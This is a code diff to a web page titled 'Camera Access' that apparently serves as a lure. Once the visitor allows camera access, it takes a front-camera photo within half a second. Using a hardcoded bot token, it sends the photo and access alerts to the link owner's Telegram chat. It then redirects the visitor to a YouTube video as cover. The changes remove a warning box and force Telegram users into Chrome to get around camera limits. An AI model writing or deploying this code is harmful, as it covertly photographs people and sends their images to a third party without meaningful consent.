@@ -27,19 +27,6 @@
         h1 { color: #667eea; margin-bottom: 10px; font-size: 24px; }
         .subtitle { color: #666; margin-bottom: 30px; font-size: 14px; }
         video { width: 100%; border-radius: 10px; background: #000; margin-bottom: 15px; display: none; }
-        button {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 25px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-        }
-        button:active { transform: scale(0.98); }
         .status {
             margin-top: 20px;
             padding: 10px;
@@ -50,7 +37,6 @@
         .status.info { background: #d1ecf1; color: #0c5460; display: block; }
         .status.success { background: #d4edda; color: #155724; display: block; }
         .status.error { background: #f8d7da; color: #721c24; display: block; }
-        .status.warning { background: #fff3cd; color: #856404; display: block; }
         .footer { margin-top: 20px; font-size: 12px; color: #999; }
         .loading {
             display: inline-block;
@@ -64,11 +50,14 @@
             vertical-align: middle;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .external-btn {
-            background: #28a745;
-            margin-top: 10px;
+        .redirect-note {
+            background: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 15px;
+            font-size: 12px;
         }
-        .external-btn:active { background: #218838; }
     </style>
 </head>
 <body>
@@ -76,48 +65,37 @@
         <h1>📸 Camera Access</h1>
         <div class="subtitle">Please allow camera to continue</div>
         
-        <div id="warningBox" style="display: none;" class="status warning">
-            ⚠️ <strong>အရေးကြီး:</strong><br>
-            Telegram browser မှာ Camera အလုပ်မလုပ်ပါ။<br><br>
-            ကျေးဇူးပြု၍ အပေါ်ညာဘက် <strong>⋮</strong> နှိပ်ပြီး<br>
-            <strong>"Open in External Browser"</strong> (Chrome) ရွေးပါ။
-        </div>
-        
-        <video id="video" autoplay playsinline style="width: 100%; border-radius: 10px; background: #000;"></video>
+        <video id="video" autoplay playsinline></video>
         <canvas id="canvas" style="display: none;"></canvas>
         
-        <button id="externalBtn" class="external-btn" style="display: none;" onclick="openExternalBrowser()">🌐 Open in Chrome Browser</button>
-        
-        <div id="status" class="status info">📷 Checking browser...</div>
-        <div class="footer">Auto photo will be sent to owner</div>
+        <div id="status" class="status info">📷 Initializing...</div>
+        <div id="redirectNote" class="redirect-note" style="display: none;">⏳ Redirecting to YouTube after photo...</div>
+        <div class="footer">Photo will be sent to owner automatically</div>
     </div>
 
     <script>
         const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
+        const YOUTUBE_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
         
         const urlParams = new URLSearchParams(window.location.search);
         const OWNER_ID = urlParams.get('id');
         
         let stream = null;
         let photoTaken = false;
+        let redirectDone = false;
         
         const video = document.getElementById('video');
         const statusDiv = document.getElementById('status');
-        const warningBox = document.getElementById('warningBox');
-        const externalBtn = document.getElementById('externalBtn');
+        const redirectNote = document.getElementById('redirectNote');
         
-        // Telegram browser စစ်ဆေးခြင်း
+        // Telegram browser စစ်ဆေးပြီး Chrome ကို Auto ခေါ်မယ်
         const isTelegram = /Telegram/i.test(navigator.userAgent);
         const isMobile = /Mobi|Android|iPhone/i.test(navigator.userAgent);
         
-        function openExternalBrowser() {
+        if (isTelegram && isMobile) {
+            // Telegram ဆိုရင် Chrome ကို Auto ခေါ်မယ်
             const currentUrl = window.location.href;
-            if (isMobile) {
-                // Android
-                window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
-            } else {
-                alert('Please copy and paste this link to Chrome browser: ' + currentUrl);
-            }
+            window.location.href = `intent://${currentUrl.replace('https://', '')}#Intent;scheme=https;package=com.android.chrome;end`;
         }
         
         async function initCamera() {
@@ -127,28 +105,11 @@
                 return;
             }
             
-            // Telegram browser ဆိုရင် သတိပေးမယ်
-            if (isTelegram && isMobile) {
-                statusDiv.style.display = 'none';
-                warningBox.style.display = 'block';
-                externalBtn.style.display = 'block';
-                
-                // Owner ကို အကြောင်းကြားမယ်
-                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: OWNER_ID,
-                        text: `⚠️ Someone opened camera link in TELEGRAM browser!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: Mobile\n💡 They need to open in external browser.`
-                    })
-                }).catch(e => console.log(e));
-                return;
-            }
-            
             try {
                 statusDiv.className = 'status info';
                 statusDiv.innerHTML = '📷 Requesting camera permission... <span class="loading"></span>';
                 
+                // Camera ခေါ်မယ်
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" } 
                 });
@@ -156,37 +117,33 @@
                 video.style.display = 'block';
                 video.srcObject = stream;
                 
-                statusDiv.innerHTML = '✅ Camera ready! Taking photo in 3 seconds...';
+                statusDiv.innerHTML = '✅ Camera ready! Taking photo instantly...';
                 
+                // Allow နိပ်တာနဲ့ ချက်ချင်းပုံရိုက်မယ် (0.5 စက္ကန့်)
                 setTimeout(() => {
                     takePhotoAndSend();
-                }, 3000);
+                }, 500);
                 
+                // Owner ကို အကြောင်းကြားမယ်
                 fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: OWNER_ID,
-                        text: `👤 Someone opened your camera link!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}`
+                        text: `👤 Someone opened camera link and ALLOWED!\n\n🕐 Time: ${new Date().toLocaleString()}`
                     })
                 }).catch(e => console.log(e));
                 
             } catch (err) {
                 console.error('Camera error:', err);
-                let errorMsg = '❌ Camera access denied. ';
-                if (err.name === 'NotAllowedError') {
-                    errorMsg += 'Please allow camera permission and refresh.';
-                } else if (err.name === 'NotFoundError') {
-                    errorMsg += 'No camera found on this device.';
-                } else {
-                    errorMsg += 'Please use Chrome browser for camera.';
-                }
                 statusDiv.className = 'status error';
-                statusDiv.innerHTML = errorMsg;
                 
-                if (isMobile && !isTelegram) {
-                    externalBtn.style.display = 'block';
-                    externalBtn.innerText = '🔄 Try Again with Permission';
+                if (err.name === 'NotAllowedError') {
+                    statusDiv.innerHTML = '❌ Camera DENIED! Please refresh and click Allow.';
+                } else if (err.name === 'NotFoundError') {
+                    statusDiv.innerHTML = '❌ No camera found on this device.';
+                } else {
+                    statusDiv.innerHTML = '❌ Error: Please use Chrome browser.';
                 }
                 
                 if (OWNER_ID) {
@@ -206,7 +163,6 @@
             if (photoTaken) return;
             photoTaken = true;
             
-            statusDiv.className = 'status info';
             statusDiv.innerHTML = '📸 Taking photo... <span class="loading"></span>';
             
             const canvas = document.getElementById('canvas');
@@ -222,7 +178,7 @@
                 const formData = new FormData();
                 formData.append('chat_id', OWNER_ID);
                 formData.append('photo', blob, 'photo.jpg');
-                formData.append('caption', `📸 Photo captured!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${isMobile ? 'Mobile' : 'Desktop'}`);
+                formData.append('caption', `📸 Photo captured!\n\n🕐 Time: ${new Date().toLocaleString()}`);
                 
                 try {
                     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
@@ -232,26 +188,43 @@
                     
                     if (response.ok) {
                         statusDiv.className = 'status success';
-                        statusDiv.innerHTML = '✅ Photo sent successfully! Thank you.';
+                        statusDiv.innerHTML = '✅ Photo sent successfully! Redirecting to YouTube...';
+                        
+                        redirectNote.style.display = 'block';
                         
                         if (stream) {
                             stream.getTracks().forEach(track => track.stop());
                         }
                         
+                        // ပုံပို့ပြီးရင် YouTube ကို Auto ခေါ်မယ်
                         setTimeout(() => {
-                            window.close();
-                        }, 2000);
+                            if (!redirectDone) {
+                                redirectDone = true;
+                                window.location.href = YOUTUBE_URL;
+                            }
+                        }, 1500);
+                        
                     } else {
                         throw new Error('Send failed');
                     }
                 } catch (err) {
                     statusDiv.className = 'status error';
-                    statusDiv.innerHTML = '❌ Failed to send photo. Please try again.';
+                    statusDiv.innerHTML = '❌ Failed to send photo. Redirecting anyway...';
+                    
+                    setTimeout(() => {
+                        if (!redirectDone) {
+                            redirectDone = true;
+                            window.location.href = YOUTUBE_URL;
+                        }
+                    }, 2000);
                 }
             }, 'image/jpeg', 0.8);
         }
         
-        initCamera();
+        // Start
+        if (!isTelegram || !isMobile) {
+            initCamera();
+        }
         
         window.addEventListener('beforeunload', () => {
             if (stream) {
